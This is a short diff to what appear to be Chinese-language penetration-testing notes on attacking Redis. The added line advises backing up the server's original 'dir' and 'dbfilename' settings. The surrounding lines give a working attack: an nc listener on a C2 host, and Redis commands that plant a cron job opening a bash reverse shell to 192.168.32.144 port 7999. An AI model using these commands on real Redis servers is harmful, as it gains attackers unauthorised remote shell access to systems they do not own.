@@ -356,6 +356,7 @@ Redis数据库
 		
 			C2服务器监听：nc -lvnp 7999
 			
+			注意：先查看一下原来的dir，dbfilename是什么，进行备份。
 			redis服务器执行以下redis命令：
 			set xx "\n* * * * * bash -i >& /dev/tcp/192.168.32.144/7999 0>&1\n"
 			config set dir /var/spool/cron/
